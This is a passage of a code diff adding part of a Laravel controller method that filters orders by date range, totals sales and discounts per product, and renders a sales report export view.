+            $ed = Carbon::now()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+
+            //show data into report print
+            $s_date = date('d/m/Y', strtotime($sd));
+            $e_date = date('d/m/Y', strtotime($ed));
+        } elseif ($request->input('start_date') && $request->input('end_date')) {
+            $sd = Carbon::parse($request->input('start_date'))->startOfDay()->toDateTimeString();
+            $ed = Carbon::parse($request->input('end_date'))->endOfDay()->toDateTimeString();
+
+            $data->whereBetween('orders.created_at', [$sd, $ed]);
+
+            //show data into report print
+            $s_date = date('d/m/Y', strtotime($sd));
+            $e_date = date('d/m/Y', strtotime($ed));
+        }
+
+        $orders = $data->where('status', 1)->get()->groupBy('product_id');
+        foreach ($orders as $order) {
+            $result[$order->first()->get_product->name] = [
+                'sales' => $order->sum('price'),
+                'discount' => $order->sum('discount'),
+            ];
+        }
+        //dd($result);
+
+        $settings = WebSettings::with('get_logo')->where('id', 1)->first();
+
+        return view('backEnd.admin.reports.sales.sales_export', compact('result', 'settings', 'cr', 's_date', 'e_date'))->render();
+    }
+}
